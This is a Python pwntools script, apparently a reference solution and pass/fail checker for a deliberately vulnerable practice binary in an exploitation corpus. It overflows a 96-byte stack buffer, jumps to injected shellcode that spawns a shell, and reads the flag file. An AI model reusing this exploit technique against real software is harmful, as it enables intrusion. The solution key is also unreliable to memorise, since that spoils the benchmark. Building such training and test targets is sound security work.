#!/usr/bin/env python3
"""
Hand-verified standalone pwntools reference exploit for corpus_r2 target
01_stack_shellcode_relay.

Technique: shellcode-on-stack. No protections at all (canary=OFF, NX=OFF,
PIE=OFF). vuln() prints the address of its 96-byte `buf`, then relay()
memcpy()s an attacker-controlled amount of data (up to 300 bytes, read from
stdin) straight into it with no bound check -- the overflow flows through
an intermediate copy, not a direct read() into buf.

Stack layout (measured with a cyclic pattern + corefile inspection):
  buf[96] + saved_rbp[8] = 104 bytes of padding before the saved return
  address. Shellcode is placed immediately AFTER the overwritten return
  address (not inside buf itself), and the return address is redirected
  there, landing on an executable stack.

Run directly:
    python3 01_stack_shellcode_relay_reference.py
"""
import os
import sys

from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = os.path.join(HERE, "..", "corpus_r2", "01_stack_shellcode_relay")
BINARY = os.path.join(TARGET_DIR, "stack_shellcode_relay")
FLAG_FILE = os.path.join(TARGET_DIR, "flag.txt")

context.arch = "amd64"
context.log_level = "error"

OFFSET_TO_RETADDR = 104


def exploit():
    elf = ELF(BINARY, checksec=False)
    io = process(elf.path, cwd=TARGET_DIR)

    io.recvuntil(b"buf @ ")
    buf_addr = int(io.recvline().strip(), 16)
    io.recvuntil(b"shellcode> ")

    shellcode = asm(shellcraft.sh())
    return_target = buf_addr + OFFSET_TO_RETADDR + 8  # right after saved retaddr
    payload = b"A" * OFFSET_TO_RETADDR + p64(return_target) + shellcode
    io.send(payload)

    io.sendline(b"cat flag.txt")
    return io


def main():
    with open(FLAG_FILE) as f:
        expected_flag = f.read().strip()

    io = exploit()
    output = io.recvrepeat(timeout=3)
    io.close()

    ok = expected_flag.encode() in output
    print(f"[{'PASS' if ok else 'FAIL'}] 01_stack_shellcode_relay: "
          f"expected flag {'found' if ok else 'NOT found'} in output")
    if not ok:
        print("---- captured output ----")
        print(output)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
